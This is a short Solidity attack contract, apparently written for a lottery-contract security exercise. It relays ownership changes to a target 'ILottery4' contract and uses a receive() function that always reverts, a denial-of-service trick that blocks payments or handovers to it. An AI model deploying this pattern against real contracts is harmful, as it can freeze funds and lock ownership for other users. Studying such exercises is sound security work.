// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// import "@ganache/console.log/console.sol";


interface ILottery4 {
    function setOwner(address _newOwner) external;
}

contract OwnerBlock {
    modifier onlyOwner() {
        require(msg.sender == owner, "Attack Only owner can perform this action");
        _;
    }
  address owner;
  ILottery4 public immutable lotteryContract;

  constructor(address _lotteryContractAddress) {
    lotteryContract = ILottery4(_lotteryContractAddress);
    owner = msg.sender;
  }

  function setOwner(address _newOwner) external onlyOwner {
    lotteryContract.setOwner(_newOwner);
  }

  receive() external payable {
    require(false);
  }
}




